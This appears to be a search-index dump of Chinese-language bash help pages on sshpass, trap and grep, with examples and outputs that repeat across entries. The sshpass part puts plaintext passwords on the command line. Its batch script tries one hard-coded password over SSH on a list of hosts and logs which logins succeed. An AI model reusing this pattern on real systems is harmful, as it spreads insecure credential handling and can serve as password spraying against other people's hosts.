\u76f4\u63a5\u8fdc\u7a0b\u8fde\u63a5\u67d0\u53f0\u4e3b\u673a\uff1a [root@linuxcool ~]# sshpass -p xxx ssh root@192.168.11.11 \u672c\u5730\u6267\u884c\u8fdc\u7a0b\u673a\u5668\u7684\u547d\u4ee4\uff1a [root@linuxcool ~]# sshpass -p xxx ssh root@192.168.11.11 \"ethtool eth0\" \u8fdc\u7a0b\u8fde\u63a5\u6307\u5b9assh\u7684\u7aef\u53e3\uff1a [root@linuxcool ~]# sshpass -p 123456 ssh -p 1000 root@192.168.11.11 \u4ece\u5bc6\u7801\u6587\u4ef6\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\u4f5c\u4e3a\u5bc6\u7801\u53bb\u8fdc\u7a0b\u8fde\u63a5\u4e3b\u673a\uff1a [root@linuxcool ~]# sshpass -f xxx.txt ssh root@192.168.11.11 \u4ece\u8fdc\u7a0b\u4e3b\u673a\u4e0a\u62c9\u53d6\u6587\u4ef6\u5230\u672c\u5730\uff1a [root@linuxcool ~]# sshpass -p '123456' scp root@host_ip:/home/test/t ./tmp/ \u6279\u91cf\u767b\u5f55\u670d\u52a1\u5668 #!/bin/bash #\u628aIP\u5730\u5740\u653e\u5728\u540c\u7ea7\u76ee\u5f55\u4e0bip.txt\u4e2d\uff0c\u4e00\u884c\u653e\u4e00\u4e2a #\u4f7f\u7528\u65b9\u6cd5 sh ssh.sh ip.txt #\u6267\u884c\u811a\u672c\u7684\u673a\u5668\u7cfb\u7edf\u5185\u5148\u5b89\u88c5sshpass,yum\u5b89\u88c5\u5373\u53ef,\u628a123456\u6362\u6210\u96c6\u7fa4\u7684\u7edf\u4e00\u5bc6\u7801 for i in `grep -v \"#\" $1` do sshpass -p \"123456\" ssh $i \"ls\" > /dev/null 2>&1 if [ $? -eq 0 ];then echo \"$i\" >> sucess.txt else echo \"$i\" >> error.txt fi done","title":"bash\u6279\u91cf\u767b\u5f55\u670d\u52a1\u5668"},{"location":"programming_language/bash_help/sshpass/#sshpass","text":"sshpass\u547d\u4ee4\u7528\u4e8e\u975e\u4ea4\u4e92\u7684 ssh \u5bc6\u7801\u9a8c\u8bc1\u3002\u53ef\u4ee5\u5728\u547d\u4ee4\u884c\u76f4\u63a5\u4f7f\u7528\u5bc6\u7801\u6765\u8fdb\u884c\u8fdc\u7a0b\u8fde\u63a5\u548c\u8fdc\u7a0b\u62c9\u53d6\u6587\u4ef6\u3002\u4f7f\u7528\u524d\u63d0\uff1a\u5bf9\u4e8e\u672a\u8fde\u63a5\u8fc7\u7684\u4e3b\u673a\u3002\u800c\u53c8\u4e0d\u8f93\u5165yes\u8fdb\u884c\u786e\u8ba4\uff0c\u9700\u8981\u8fdb\u884csshd\u670d\u52a1\u7684\u4f18\u5316\u3002","title":"Sshpass"},{"location":"programming_language/bash_help/sshpass/#_1","text":"\u8bed\u6cd5\u683c\u5f0f\uff1a sshpass [\u53c2\u6570] \u5e38\u7528\u53c2\u6570\uff1a -p \u6307\u5b9a\u5bc6\u7801 -f \u6307\u5b9a\u6587\u4ef6 \u53c2\u8003\u5b9e\u4f8b \u5b89\u88c5sshpass\uff1a [root@linuxcool ~]# yum install -y epel-release [root@linuxcool ~]# yum install -y sshpass [root@linuxcool ~]# sshpass -V \u57fa\u672c\u4f7f\u7528\u65b9\u6cd5\uff1a [root@linuxcool ~]# sshpass -p \"password\" ssh username@ip \u5f53\u8fdc\u7a0b\u4e3b\u673a\u7aef\u53e3\u4e0d\u518d\u662f22\u9ed8\u8ba4\u7aef\u53e3\u65f6\u5019\uff1a [root@linuxcool ~]# sshpass -p \"password\" ssh -p 8443 username@ip \u76f4\u63a5\u8fdc\u7a0b\u8fde\u63a5\u67d0\u53f0\u4e3b\u673a\uff1a [root@linuxcool ~]# sshpass -p xxx ssh root@192.168.11.11 \u672c\u5730\u6267\u884c\u8fdc\u7a0b\u673a\u5668\u7684\u547d\u4ee4\uff1a [root@linuxcool ~]# sshpass -p xxx ssh root@192.168.11.11 \"ethtool eth0\" \u8fdc\u7a0b\u8fde\u63a5\u6307\u5b9assh\u7684\u7aef\u53e3\uff1a [root@linuxcool ~]# sshpass -p 123456 ssh -p 1000 root@192.168.11.11 \u4ece\u5bc6\u7801\u6587\u4ef6\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\u4f5c\u4e3a\u5bc6\u7801\u53bb\u8fdc\u7a0b\u8fde\u63a5\u4e3b\u673a\uff1a [root@linuxcool ~]# sshpass -f xxx.txt ssh root@192.168.11.11 \u4ece\u8fdc\u7a0b\u4e3b\u673a\u4e0a\u62c9\u53d6\u6587\u4ef6\u5230\u672c\u5730\uff1a [root@linuxcool ~]# sshpass -p '123456' scp root@host_ip:/home/test/t ./tmp/","title":"\u8bed\u6cd5"},{"location":"programming_language/bash_help/sshpass/#_2","text":"#!/bin/bash #\u628aIP\u5730\u5740\u653e\u5728\u540c\u7ea7\u76ee\u5f55\u4e0bip.txt\u4e2d\uff0c\u4e00\u884c\u653e\u4e00\u4e2a #\u4f7f\u7528\u65b9\u6cd5 sh ssh.sh ip.txt #\u6267\u884c\u811a\u672c\u7684\u673a\u5668\u7cfb\u7edf\u5185\u5148\u5b89\u88c5sshpass,yum\u5b89\u88c5\u5373\u53ef,\u628a123456\u6362\u6210\u96c6\u7fa4\u7684\u7edf\u4e00\u5bc6\u7801 for i in `grep -v \"#\" $1` do sshpass -p \"123456\" ssh $i \"ls\" > /dev/null 2>&1 if [ $? -eq 0 ];then echo \"$i\" >> sucess.txt else echo \"$i\" >> error.txt fi done","title":"\u6279\u91cf\u767b\u5f55\u670d\u52a1\u5668"},{"location":"programming_language/bash_help/trap/","text":"trap \u8bed\u6cd5 \u8bed\u6cd5\u683c\u5f0f\uff1a trap [\u53c2\u6570] \u5e38\u7528\u53c2\u6570\uff1a -l \u6253\u5370\u4fe1\u53f7\u5217\u8868 -p \u6253\u5370\u4e0e\u6bcf\u4e00\u4e2a\u4fe1\u53f7\u6709\u5173\u8054\u7684\u547d\u4ee4\u7684\u5217\u8868 1\u3001\u6355\u83b7\u811a\u672c\u4e2d\u7684\u5f02\u5e38 \u200b \u53ef\u4ee5\u6355\u83b7\u811a\u672c\u4e2d\u6267\u884c\u9519\u8bef\u7684\u547d\u4ee4\uff0c\u9700\u8981\u6dfb\u52a0set -E\uff0ctrap \u201cecho \u9519\u8bef\u201d ERR \u4f8b\uff1a #!/bin/bash set -E trap 'echo \u6293\u4f4f\u975e\u96f6\u8fd4\u56de\u503c' ERR sub() { ls dfqwefi rm fwjepf } sub 2\u3001\u6355\u83b7Linux\u4fe1\u53f7 Linux\u7cfb\u7edf\u5229\u7528\u4fe1\u53f7\u4e0e\u7cfb\u7edf\u4e2d\u7684\u8fdb\u7a0b\u8fdb\u884c\u901a\u4fe1\u3002Linux\u7684\u5e38\u89c1\u4fe1\u53f7\u6709\uff1a \u4fe1\u53f7 \u503c \u63cf\u8ff0 1 SIGHP \u6302\u8d77\u8fdb\u7a0b 2 SIGINT \u7ec8\u6b62\u8fdb\u7a0b 3 SIGQUIT \u505c\u6b62\u8fdb\u7a0b 9 SIGKILL \u65e0\u6761\u4ef6\u7ec8\u6b62\u8fdb\u7a0b 15 SIGTERM \u5c3d\u53ef\u80fd\u7ec8\u6b62\u8fdb\u7a0b 17 SIGSTOP \u65e0\u6761\u4ef6\u505c\u6b62\u8fdb\u7a0b\uff0c\u4f46\u4e0d\u662f\u7ec8\u6b62\u8fdb\u7a0b 18 SIGTSTP \u505c\u6b62\u6216\u6682\u505c\u8fdb\u7a0b\uff0c\u4f46\u4e0d\u7ec8\u6b62\u8fdb\u7a0b 19 SIGCONT \u7ee7\u7eed\u8fd0\u884c\u505c\u6b62\u7684\u8fdb\u7a0b Ctrl+C\u7ec4\u5408\u952e\u4f1a\u4ea7\u751fSIGINT\u4fe1\u53f7\uff0cCtrl+Z\u4f1a\u4ea7\u751fSIGTSTP\u4fe1\u53f7\u3002 trap\u547d\u4ee4\u5141\u8bb8\u4f60\u6765\u6307\u5b9ashell\u811a\u672c\u8981\u76d1\u89c6\u5e76\u62e6\u622a\u7684Linux\u4fe1\u53f7\u3002trap\u547d\u4ee4\u7684\u683c\u5f0f\u4e3a\uff1a trap commands signals \u3002 \u4f8b1\uff1a #!/bin/bash # test trap command trap \"echo 'Sorry! I have trapped Ctrl-C'\" SIGINT echo This is a test script count=1 while [ $count -le 10 ] do echo \"Loop $count\" sleep 1 count=$[ $count + 1 ] done echo The end. \u8fd0\u884c\u7ed3\u679c\uff1a This is a test script Loop 1 Loop 2 ^CSorry! I have trapped Ctrl-C Loop 3 Loop 4 ^CSorry! I have trapped Ctrl-C Loop 5 Loop 6 Loop 7 Loop 8 ^CSorry! I have trapped Ctrl-C Loop 9 Loop 10 The end. \u4f8b2\uff1a \u9664\u4e86\u5728shell\u811a\u672c\u4e2d\u6355\u83b7\u4fe1\u53f7\u5916\uff0c\u4e5f\u53ef\u4ee5\u5728shell\u9000\u51fa\u65f6\u6355\u83b7\uff0c\u5728trap\u547d\u4ee4\u540e\u52a0\u4e0aEXIT\u4fe1\u53f7\u5c31\u884c\u3002 #!/bin/bash # test trap command trap \"echo Goodbye.\" EXIT echo This is a test script count=1 while [ $count -le 10 ] do echo \"Loop $count\" sleep 1 count=$[ $count + 1 ] done echo The end. \u8fd0\u884c\u7ed3\u679c\uff1a This is a test script Loop 1 Loop 2 Loop 3 Loop 4 Loop 5 Loop 6 Loop 7 Loop 8 Loop 9 Loop 10 The end. Goodbye. \u4f8b3\uff1a #!/bin/bash # test trap command trap \"echo 'Sorry! I have trapped Ctrl-C'\" SIGINT count=1 while [ $count -le 5 ] do echo \"Loop $count\" sleep 1 count=$[ $count + 1 ] done trap \"echo 'Sorry! The trap has been modified.'\" SIGINT count=1 while [ $count -le 5 ] do echo \"Loop $count\" sleep 1 count=$[ $count + 1 ] done echo The end. \u8fd0\u884c\u7ed3\u679c\uff1a Loop 1 Loop 2 Loop 3 ^CSorry! I have trapped Ctrl-C Loop 4 Loop 5 Loop 1 Loop 2 Loop 3 ^CSorry! The trap has been modified. Loop 4 Loop 5 The end. \u4f8b4\uff1a \u5220\u9664\u6355\u83b7\uff0c\u547d\u4ee4\u5f62\u5f0f\u4e3a\uff1a trap - *** \uff0c\u4f8b\u5982 trap - SIGINT #!/bin/bash # test trap command trap \"echo 'Sorry! I have trapped Ctrl-C'\" SIGINT count=1 while [ $count -le 5 ] do echo \"Loop $count\" sleep 1 count=$[ $count + 1 ] done trap - SIGINT count=1 while [ $count -le 5 ] do echo \"Loop $count\" sleep 1 count=$[ $count + 1 ] done echo The end. \u8fd0\u884c\u7ed3\u679c\uff1a Loop 1!!! Loop 2!!! Loop 3!!! ^CSorry! I have trapped Ctrl-C Loop 4!!! Loop 5!!! Loop 1 Loop 2 ^C","title":"bash\u4e2d\u7684\u5f02\u5e38\u5904\u7406"},{"location":"programming_language/bash_help/trap/#trap","text":"","title":"trap"},{"location":"programming_language/bash_help/trap/#_1","text":"\u8bed\u6cd5\u683c\u5f0f\uff1a trap [\u53c2\u6570] \u5e38\u7528\u53c2\u6570\uff1a -l \u6253\u5370\u4fe1\u53f7\u5217\u8868 -p \u6253\u5370\u4e0e\u6bcf\u4e00\u4e2a\u4fe1\u53f7\u6709\u5173\u8054\u7684\u547d\u4ee4\u7684\u5217\u8868","title":"\u8bed\u6cd5"},{"location":"programming_language/bash_help/trap/#1","text":"\u200b \u53ef\u4ee5\u6355\u83b7\u811a\u672c\u4e2d\u6267\u884c\u9519\u8bef\u7684\u547d\u4ee4\uff0c\u9700\u8981\u6dfb\u52a0set -E\uff0ctrap \u201cecho \u9519\u8bef\u201d ERR","title":"1\u3001\u6355\u83b7\u811a\u672c\u4e2d\u7684\u5f02\u5e38"},{"location":"programming_language/bash_help/trap/#_2","text":"#!/bin/bash set -E trap 'echo \u6293\u4f4f\u975e\u96f6\u8fd4\u56de\u503c' ERR sub() { ls dfqwefi rm fwjepf } sub","title":"\u4f8b\uff1a"},{"location":"programming_language/bash_help/trap/#2linux","text":"Linux\u7cfb\u7edf\u5229\u7528\u4fe1\u53f7\u4e0e\u7cfb\u7edf\u4e2d\u7684\u8fdb\u7a0b\u8fdb\u884c\u901a\u4fe1\u3002Linux\u7684\u5e38\u89c1\u4fe1\u53f7\u6709\uff1a \u4fe1\u53f7 \u503c \u63cf\u8ff0 1 SIGHP \u6302\u8d77\u8fdb\u7a0b 2 SIGINT \u7ec8\u6b62\u8fdb\u7a0b 3 SIGQUIT \u505c\u6b62\u8fdb\u7a0b 9 SIGKILL \u65e0\u6761\u4ef6\u7ec8\u6b62\u8fdb\u7a0b 15 SIGTERM \u5c3d\u53ef\u80fd\u7ec8\u6b62\u8fdb\u7a0b 17 SIGSTOP \u65e0\u6761\u4ef6\u505c\u6b62\u8fdb\u7a0b\uff0c\u4f46\u4e0d\u662f\u7ec8\u6b62\u8fdb\u7a0b 18 SIGTSTP \u505c\u6b62\u6216\u6682\u505c\u8fdb\u7a0b\uff0c\u4f46\u4e0d\u7ec8\u6b62\u8fdb\u7a0b 19 SIGCONT \u7ee7\u7eed\u8fd0\u884c\u505c\u6b62\u7684\u8fdb\u7a0b Ctrl+C\u7ec4\u5408\u952e\u4f1a\u4ea7\u751fSIGINT\u4fe1\u53f7\uff0cCtrl+Z\u4f1a\u4ea7\u751fSIGTSTP\u4fe1\u53f7\u3002 trap\u547d\u4ee4\u5141\u8bb8\u4f60\u6765\u6307\u5b9ashell\u811a\u672c\u8981\u76d1\u89c6\u5e76\u62e6\u622a\u7684Linux\u4fe1\u53f7\u3002trap\u547d\u4ee4\u7684\u683c\u5f0f\u4e3a\uff1a trap commands signals \u3002","title":"2\u3001\u6355\u83b7Linux\u4fe1\u53f7"},{"location":"programming_language/bash_help/trap/#1_1","text":"#!/bin/bash # test trap command trap \"echo 'Sorry! I have trapped Ctrl-C'\" SIGINT echo This is a test script count=1 while [ $count -le 10 ] do echo \"Loop $count\" sleep 1 count=$[ $count + 1 ] done echo The end. \u8fd0\u884c\u7ed3\u679c\uff1a This is a test script Loop 1 Loop 2 ^CSorry! I have trapped Ctrl-C Loop 3 Loop 4 ^CSorry! I have trapped Ctrl-C Loop 5 Loop 6 Loop 7 Loop 8 ^CSorry! I have trapped Ctrl-C Loop 9 Loop 10 The end.","title":"\u4f8b1\uff1a"},{"location":"programming_language/bash_help/trap/#2","text":"\u9664\u4e86\u5728shell\u811a\u672c\u4e2d\u6355\u83b7\u4fe1\u53f7\u5916\uff0c\u4e5f\u53ef\u4ee5\u5728shell\u9000\u51fa\u65f6\u6355\u83b7\uff0c\u5728trap\u547d\u4ee4\u540e\u52a0\u4e0aEXIT\u4fe1\u53f7\u5c31\u884c\u3002 #!/bin/bash # test trap command trap \"echo Goodbye.\" EXIT echo This is a test script count=1 while [ $count -le 10 ] do echo \"Loop $count\" sleep 1 count=$[ $count + 1 ] done echo The end. \u8fd0\u884c\u7ed3\u679c\uff1a This is a test script Loop 1 Loop 2 Loop 3 Loop 4 Loop 5 Loop 6 Loop 7 Loop 8 Loop 9 Loop 10 The end. Goodbye.","title":"\u4f8b2\uff1a"},{"location":"programming_language/bash_help/trap/#3","text":"#!/bin/bash # test trap command trap \"echo 'Sorry! I have trapped Ctrl-C'\" SIGINT count=1 while [ $count -le 5 ] do echo \"Loop $count\" sleep 1 count=$[ $count + 1 ] done trap \"echo 'Sorry! The trap has been modified.'\" SIGINT count=1 while [ $count -le 5 ] do echo \"Loop $count\" sleep 1 count=$[ $count + 1 ] done echo The end. \u8fd0\u884c\u7ed3\u679c\uff1a Loop 1 Loop 2 Loop 3 ^CSorry! I have trapped Ctrl-C Loop 4 Loop 5 Loop 1 Loop 2 Loop 3 ^CSorry! The trap has been modified. Loop 4 Loop 5 The end.","title":"\u4f8b3\uff1a"},{"location":"programming_language/bash_help/trap/#4","text":"\u5220\u9664\u6355\u83b7\uff0c\u547d\u4ee4\u5f62\u5f0f\u4e3a\uff1a trap - *** \uff0c\u4f8b\u5982 trap - SIGINT #!/bin/bash # test trap command trap \"echo 'Sorry! I have trapped Ctrl-C'\" SIGINT count=1 while [ $count -le 5 ] do echo \"Loop $count\" sleep 1 count=$[ $count + 1 ] done trap - SIGINT count=1 while [ $count -le 5 ] do echo \"Loop $count\" sleep 1 count=$[ $count + 1 ] done echo The end. \u8fd0\u884c\u7ed3\u679c\uff1a Loop 1!!! Loop 2!!! Loop 3!!! ^CSorry! I have trapped Ctrl-C Loop 4!!! Loop 5!!! Loop 1 Loop 2 ^C","title":"\u4f8b4\uff1a"},{"location":"programming_language/bash_help/re/grep/","text":"Grep grep \u662f\u4e00\u4e2a\u6700\u521d\u7528\u4e8e Unix \u64cd\u4f5c\u7cfb\u7edf\u7684 \u547d\u4ee4\u884c \u5de5\u5177\u3002\u5728\u7ed9\u51fa\u6587\u4ef6\u5217\u8868\u6216 \u6807\u51c6\u8f93\u5165 \u540e\uff0cgrep\u4f1a\u5bf9\u5339\u914d\u4e00\u4e2a\u6216\u591a\u4e2a \u6b63\u5219\u8868\u8fbe\u5f0f \u7684\u6587\u672c\u8fdb\u884c\u641c\u7d22\uff0c\u5e76\u53ea\u8f93\u51fa\u5339\u914d\uff08\u6216\u8005\u4e0d\u5339\u914d\uff09\u7684\u884c\u6216\u6587\u672c\u3002 grep\u8fd9\u4e2a\u5e94\u7528\u7a0b\u5e8f\u6700\u65e9\u7531 \u80af\u00b7\u6c64\u666e\u900a \u5199\u6210\u3002grep\u539f\u5148\u662fed\u4e0b\u7684\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\uff0c\u540d\u79f0\u6765\u81ea\u4e8eg/re/p\uff08globally search a regular expression and print\uff0c\u4ee5\u6b63\u5219\u8868\u8fbe\u5f0f\u8fdb\u884c\u5168\u5c40\u67e5\u627e\u4ee5\u53ca\u6253\u5370\uff09\u3002\u5728ed\u4e0b\uff0c\u8f93\u5165g/re/p\u8fd9\u4e2a\u547d\u4ee4\u540e\uff0c\u4f1a\u5c06\u6240\u6709\u7b26\u5408\u5148\u5b9a\u4e49\u6837\u5f0f\u7684\u5b57\u7b26\u4e32\uff0c\u4ee5\u884c\u4e3a\u5355\u4f4d\u6253\u5370\u51fa\u6765\u3002 \u57281973\u5e74\uff0cUnix\u7b2c\u56db\u7248\u4e2d\uff0cgrep\u9996\u6b21\u51fa\u73b0\u5728man\u9875\u9762\u4e2d\u3002 grep - \u7ef4\u57fa\u767e\u79d1\uff0c\u81ea\u7531\u7684\u767e\u79d1\u5168\u4e66 (wikipedia.org) \u4e0d\u5f71\u54cd\u539f\u6587\u4ef6\u5185\u5bb9\uff0c\u76ee\u7684\u5c31\u662f\u8fc7\u6ee4\u51fa\u7528\u6237\u611f\u5174\u8da3\u7684\u5185\u5bb9 grep\u5904\u7406\u7684\u6587\u4ef6\u6765\u6e90\uff1a\u6587\u672c\u6587\u4ef6\u3001\u7ba1\u9053\u3001\u6807\u51c6\u8f93\u5165 grep\u5bb6\u65cf\uff1agrep\u3001fgrep(grep -F)\u3001egrep(grep -E) \u547d\u4ee4\u683c\u5f0f grep [\u9009\u9879] \"\u6b63\u5219\u8868\u8fbe\u5f0f\" \u6587\u4ef6\u5217\u8868 grep\u6267\u884c\u72b6\u6001\u4e09\u79cd\u8fd4\u56de\u503c 0\uff1a\u8be5\u6587\u4ef6\u4e2d\u641c\u7d22\u5230\u4e86\u5339\u914d\u884c 1\uff1a\u8be5\u6587\u4ef6\u4e2d\u672a\u641c\u7d22\u5230\u5339\u914d\u884c 2\uff1a \u641c\u7d22\u7684\u6587\u4ef6\u4e0d\u5b58\u5728 [root@shell shelldoc]# grep \"root\" /etc/passwd root:x:0:0:root:/root:/bin/bash operator:x:11:0:operator:/root:/sbin/nologin [root@shell shelldoc]# echo $? 0 [root@shell shelldoc]# grep \"roooot\" /etc/passwd [root@shell shelldoc]# echo $? 1 [root@shell shelldoc]# grep \"root\" /etc/passwd1 grep: /etc/passwd1: No such file or directory [root@shell shelldoc]# echo $? 2 grep\u57fa\u672c\u4f7f\u7528 1\u3001--color \u5e26\u989c\u8272\u663e\u793a\u5339\u914d\u5230\u7684\u5173\u952e\u5b57 [root@shell shelldoc]# grep --color \"root\" /etc/passwd root:x:0:0:root:/root:/bin/bash operator:x:11:0:operator:/root:/sbin/nologin 2\u3001-i \u5ffd\u7565\u5927\u5c0f\u5199 [root@shell shelldoc]# cat pass Root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin [root@shell shelldoc]# grep \"root\" pass --color Root:x:0:0:root:/root:/bin/bash [root@shell shelldoc]# grep -i \"root\" pass --color Root:x:0:0:root:/root:/bin/bash 3\u3001-v \u53d6\u53cd [root@shell shelldoc]# grep -v \"nologin\" /etc/passwd //\u6253\u5370\u4e0d\u5305\u542bnologin\u7684\u884c 4\u3001^ \u6253\u5370/root/.bashrc\u6587\u4ef6\u4e2d\u7684\u6ce8\u91ca\u884c [root@shell shelldoc]# grep ^# /root/.bashrc \u6253\u5370/etc/inittab\u6587\u4ef6\u4e2d\u7684\u975e\u6ce8\u91ca\u884c [root@shell shelldoc]# grep -v ^# /etc/inittab id:5:initdefault: 5\u3001$ \u663e\u793apasswd\u6587\u4ef6\u4e2d\u4ee5bash\u7ed3\u5c3e\u7684\u884c [root@shell shelldoc]# grep bash$ /etc/passwd 6\u3001^$ \u7a7a\u884c [root@shell shelldoc]# grep -v ^$ /etc/rc.local 7\u3001-c count \u7edf\u8ba1\u5339\u914d\u5230\u7684\u884c\u6570 \u7edf\u8ba1\u975e\u7a7a\u884c\u7684\u6570\u91cf [root@shell shelldoc]# grep -cv ^$ /etc/rc.local 7 \u7edf\u8ba1\u7a7a\u884c\u7684\u6570\u91cf [root@shell shelldoc]# grep -c ^$ /etc/rc.local 1 8\u3001-r \u9012\u5f52\u68c0\u7d22 9\u3001-l \u4e00\u822c\u4e0e-r\u8054\u7528\uff0c\u53ea\u663e\u793a\u5305\u542b\u5173\u952e\u5b57\u7684\u6587\u4ef6\u540d\uff0c\u800c\u4e0d\u662f\u663e\u793a\u6587\u4ef6\u5185\u5bb9 [root@shell shelldoc]# grep -rl \"if\" /script/ /script/adduser1.sh /script/if7.sh /script/for9.sh /script/fuwu.sh /script/if1.sh 10\u3001-q quiet \u9759\u9ed8\u8f93\u51fa \u4e00\u822c\u5728\u5199\u811a\u672c\u65f6\u5019\u7528 [root@shell shelldoc]# grep -q root /etc/passwd [root@shell shelldoc]# echo $? 0 11\u3001-n \u663e\u793a\u5339\u914d\u884c\u7684\u884c\u53f7 [root@shell shelldoc]# grep -n root /etc/passwd 1:root:x:0:0:root:/root:/bin/bash 11:operator:x:11:0:operator:/root:/sbin/nologin 12\u3001\u5176\u4ed6\u9009\u9879 -A\u662f\u663e\u793a\u5339\u914d\u540e\u548c\u5b83\u540e\u9762\u7684n\u884c\u3002 -B\u662f\u663e\u793a\u5339\u914d\u884c\u548c\u5b83\u524d\u9762\u7684n\u884c\u3002 -C\u662f\u5339\u914d\u884c\u548c\u5b83\u524d\u540e\u5404n\u884c\u3002 grep -A 4 wike \u5bc6\u7801\u6587\u4ef6.txt \u5c31\u662f\u641c\u7d22 \u5bc6\u7801\u6587\u4ef6.txt\uff0c\u627e\u5230\u5339\u914d\u201cwike\u201d\u5b57\u4e32\u7684\u884c\uff0c\u663e\u793a\u8be5\u884c\u540e\u540e\u9762\u7d27\u8ddf\u76844\u884c","title":"grep"},{"location":"programming_language/bash_help/re/grep/#grep","text":"grep \u662f\u4e00\u4e2a\u6700\u521d\u7528\u4e8e Unix \u64cd\u4f5c\u7cfb\u7edf\u7684 \u547d\u4ee4\u884c \u5de5\u5177\u3002\u5728\u7ed9\u51fa\u6587\u4ef6\u5217\u8868\u6216 \u6807\u51c6\u8f93\u5165 \u540e\uff0cgrep\u4f1a\u5bf9\u5339\u914d\u4e00\u4e2a\u6216\u591a\u4e2a \u6b63\u5219\u8868\u8fbe\u5f0f \u7684\u6587\u672c\u8fdb\u884c\u641c\u7d22\uff0c\u5e76\u53ea\u8f93\u51fa\u5339\u914d\uff08\u6216\u8005\u4e0d\u5339\u914d\uff09\u7684\u884c\u6216\u6587\u672c\u3002 grep\u8fd9\u4e2a\u5e94\u7528\u7a0b\u5e8f\u6700\u65e9\u7531 \u80af\u00b7\u6c64\u666e\u900a \u5199\u6210\u3002grep\u539f\u5148\u662fed\u4e0b\u7684\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\uff0c\u540d\u79f0\u6765\u81ea\u4e8eg/re/p\uff08globally search a regular expression and print\uff0c\u4ee5\u6b63\u5219\u8868\u8fbe\u5f0f\u8fdb\u884c\u5168\u5c40\u67e5\u627e\u4ee5\u53ca\u6253\u5370\uff09\u3002\u5728ed\u4e0b\uff0c\u8f93\u5165g/re/p\u8fd9\u4e2a\u547d\u4ee4\u540e\uff0c\u4f1a\u5c06\u6240\u6709\u7b26\u5408\u5148\u5b9a\u4e49\u6837\u5f0f\u7684\u5b57\u7b26\u4e32\uff0c\u4ee5\u884c\u4e3a\u5355\u4f4d\u6253\u5370\u51fa\u6765\u3002 \u57281973\u5e74\uff0cUnix\u7b2c\u56db\u7248\u4e2d\uff0cgrep\u9996\u6b21\u51fa\u73b0\u5728man\u9875\u9762\u4e2d\u3002 grep - \u7ef4\u57fa\u767e\u79d1\uff0c\u81ea\u7531\u7684\u767e\u79d1\u5168\u4e66 (wikipedia.org) \u4e0d\u5f71\u54cd\u539f\u6587\u4ef6\u5185\u5bb9\uff0c\u76ee\u7684\u5c31\u662f\u8fc7\u6ee4\u51fa\u7528\u6237\u611f\u5174\u8da3\u7684\u5185\u5bb9 grep\u5904\u7406\u7684\u6587\u4ef6\u6765\u6e90\uff1a\u6587\u672c\u6587\u4ef6\u3001\u7ba1\u9053\u3001\u6807\u51c6\u8f93\u5165 grep\u5bb6\u65cf\uff1agrep\u3001fgrep(grep -F)\u3001egrep(grep -E)","title":"Grep"},{"location":"programming_language/bash_help/re/grep/#_1","text":"grep [\u9009\u9879] \"\u6b63\u5219\u8868\u8fbe\u5f0f\" \u6587\u4ef6\u5217\u8868","title":"\u547d\u4ee4\u683c\u5f0f"},{"location":"programming_language/bash_help/re/grep/#grep_1","text":"0\uff1a\u8be5\u6587\u4ef6\u4e2d\u641c\u7d22\u5230\u4e86\u5339\u914d\u884c 1\uff1a\u8be5\u6587\u4ef6\u4e2d\u672a\u641c\u7d22\u5230\u5339\u914d\u884c 2\uff1a \u641c\u7d22\u7684\u6587\u4ef6\u4e0d\u5b58\u5728 [root@shell shelldoc]# grep \"root\" /etc/passwd root:x:0:0:root:/root:/bin/bash operator:x:11:0:operator:/root:/sbin/nologin [root@shell shelldoc]# echo $? 0 [root@shell shelldoc]# grep \"roooot\" /etc/passwd [root@shell shelldoc]# echo $? 1 [root@shell shelldoc]# grep \"root\" /etc/passwd1 grep: /etc/passwd1: No such file or directory [root@shell shelldoc]# echo $? 2","title":"grep\u6267\u884c\u72b6\u6001\u4e09\u79cd\u8fd4\u56de\u503c"},{"location":"programming_language/bash_help/re/grep/#grep_2","text":"1\u3001--color \u5e26\u989c\u8272\u663e\u793a\u5339\u914d\u5230\u7684\u5173\u952e\u5b57 [root@shell shelldoc]# grep --color \"root\" /etc/passwd root:x:0:0:root:/root:/bin/bash operator:x:11:0:operator:/root:/sbin/nologin 2\u3001-i \u5ffd\u7565\u5927\u5c0f\u5199 [root@shell shelldoc]# cat pass Root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin [root@shell shelldoc]# grep \"root\" pass --color Root:x:0:0:root:/root:/bin/bash [root@shell shelldoc]# grep -i \"root\" pass --color Root:x:0:0:root:/root:/bin/bash 3\u3001-v \u53d6\u53cd [root@shell shelldoc]# grep -v \"nologin\" /etc/passwd //\u6253\u5370\u4e0d\u5305\u542bnologin\u7684\u884c 4\u3001^ \u6253\u5370/root/.bashrc\u6587\u4ef6\u4e2d\u7684\u6ce8\u91ca\u884c [root@shell shelldoc]# grep ^# /root/.bashrc \u6253\u5370/etc/inittab\u6587\u4ef6\u4e2d\u7684\u975e\u6ce8\u91ca\u884c [root@shell shelldoc]# grep -v ^# /etc/inittab id:5:initdefault: 5\u3001$ \u663e\u793apasswd\u6587\u4ef6\u4e2d\u4ee5bash\u7ed3\u5c3e\u7684\u884c [root@shell shelldoc]# grep bash$ /etc/passwd 6\u3001^$ \u7a7a\u884c [root@shell shelldoc]# grep -v ^$ /etc/rc.local 7\u3001-c count \u7edf\u8ba1\u5339\u914d\u5230\u7684\u884c\u6570 \u7edf\u8ba1\u975e\u7a7a\u884c\u7684\u6570\u91cf [root@shell shelldoc]# grep -cv ^$ /etc/rc.local 7 \u7edf\u8ba1\u7a7a\u884c\u7684\u6570\u91cf [root@shell shelldoc]# grep -c ^$ /etc/rc.local 